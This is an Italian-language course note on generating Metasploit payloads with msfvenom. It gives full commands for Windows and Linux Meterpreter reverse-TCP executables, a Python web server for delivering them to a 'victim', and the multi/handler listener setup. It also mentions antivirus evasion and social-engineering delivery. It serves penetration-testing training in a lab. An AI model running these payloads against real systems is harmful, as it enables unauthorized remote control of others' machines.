# Generating Payloads With Msfvenom

Il primo vettore di attacco per fare l'exploitation è: client-side attack. Per cui dobbiamo sapere come generare i metasploit framework payloads con un tool chiamato msfvenom.

Vediamo quindi cosa sono i client-side attacks e come differiscono dagli host-based attacks e service-based attacks.

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

Per poter rendere meno identificabili i payload ad un antivirus, vedremo come fare l'encoding del nostro payload con msfvenom. Ed infine vedremo come inserire (injecting) il nostro payload in un eseguibile legittimo per renderlo più nascosto possibile.

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1032).png" alt=""><figcaption></figcaption></figure>

***

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1006).png" alt=""><figcaption></figcaption></figure>

### Mostrare la lista di tutti i payload

```
msfvenom --list payloads
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1007).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1008).png" alt=""><figcaption></figcaption></figure>

In questo corso ci andiamo a concentrare su i meterpreter payload:

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1009).png" alt=""><figcaption></figcaption></figure>

Questo sotto evidenziato è ad esempio uno standard 32bit meterpreter payload:

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1010).png" alt=""><figcaption></figcaption></figure>

## Staged e Unstaged payload

La struttura dei nomi dei payload è:

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1011).png" alt=""><figcaption></figcaption></figure>

sistema operativo target/architettura OS target/payload type/protocollo che si vuole venga utilizzato per la connessione all'indietro verso il sistema operativo dell'attaccante.

In questo caso specifico sopra riportato può essere utile usare il payload con https perché si confonderebbe di più con traffico legittimo, e il contenuto sarebbe criptato, rispetto ad una connessione http.

Questo preso in esempio sopra è uno staged payload perché tra meterpreter e il tipo di protocollo c'è uno slash /, se ci fosse un underscore \_ invece sarebbe unstaged.

Staged significa che vengono fatti due passaggi per l'exploit, unstaged uno solo.

Unstaged payload:

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1012).png" alt=""><figcaption></figcaption></figure>

## Creare un payload con msfvenom

### Windows

```
// Creare un payload per windows 32 bit
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payload/payloadx86.exe
// Creare un payload per windows 64 bit
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payload/payloadx64.exe
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1013).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1014).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1016).png" alt=""><figcaption></figcaption></figure>

### Linux

```
// Creare un payload per linux 32 bit
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > /home/kali/Desktop/Linux_Payloads/payloadsx86
// Creare un payload per linux 64 bit
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > /home/kali/Desktop/Linux_Payloads/payloadsx64
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1020).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1021).png" alt=""><figcaption></figcaption></figure>

Per trasferire il payload sul target e farglielo eseguire dipende poi dalla tecnica di social engineering che si vorrà adottare

## Formati di estensione del payload supportati da msfvenom

```
msfvenom --list formats
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1017).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1018).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1019).png" alt=""><figcaption></figcaption></figure>

I framework transform formats sono formati che possono essere modificati prima di generare l'eseguibile.

I Framework Executable Format sono invece formati eseguibili.

## Trasferire il payload sulla vittima

Ad esempio caricare un payload su una vittima windows.

è possibile farlo creando un semplice webserver, e poi andare sulla macchina Windows 7 vittima e scaricare i file dal webserver.

Nella cartella dove sono presenti i file da trasferire:

```
sudo python -m SimpleHTTPServer 80
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1022).png" alt=""><figcaption></figcaption></figure>

## Impostare l'handler per ricevere la connessione in risposta

Dobbiamo usare il metasploit exploit multihandler è perché ogni qualvolta utilizziamo dei payload avanzati come i meterpreter payload, abbiamo bisogno di un handler appropriato che riesca a gestire la connessione ricevuta in ritorno dal sistema target

```
msfconsole
use multi/handler
//impostiamo l'opzione payload uguale a quello utilizzato nella generazione del payload con msfveno qm inviato poi alla vittima
set payload windows/meterpreter/reverse_tcp
// per linux: set payload linux/x86/meterpreter/reverse_tcp
show options
//dobbiamo ora impostare LHOST e LPORT uguali a quelli inseriti nel payload generato con msfvenom, in modo da ascoltare su quella porta dove ci aspettiamo la connessione di ritorno
set LHOST 10.10.10.5
set LPORT 1234
run
// ora l'handler rimane in ascolto per una connessione, che proverrà dal sistema vittima quando avrà eseguito il payload trasferitogli precedentemente
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1023).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1024).png" alt=""><figcaption></figcaption></figure>

## Eseguire il payload trasferito sulla vittima

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1025).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1026).png" alt=""><figcaption></figcaption></figure>

Lo scarichiamo e lo eseguiamo

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1027).png" alt=""><figcaption></figcaption></figure>

E a seguito dell'esecuzione dovremmo avere in risposta una connessione di risposta dal target all'attaccante kali.

## Connessione ricevuta sull'handler

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1028).png" alt=""><figcaption></figcaption></figure>

#### Esempio con payload Linux:

1. Impostiamo il payload dell'handler e lo eseguiamo
2. eseguiamo il payload sulla vittima
3. Otteniamo la connessione sull'handler

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1029).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (1030).png" alt=""><figcaption></figcaption></figure>

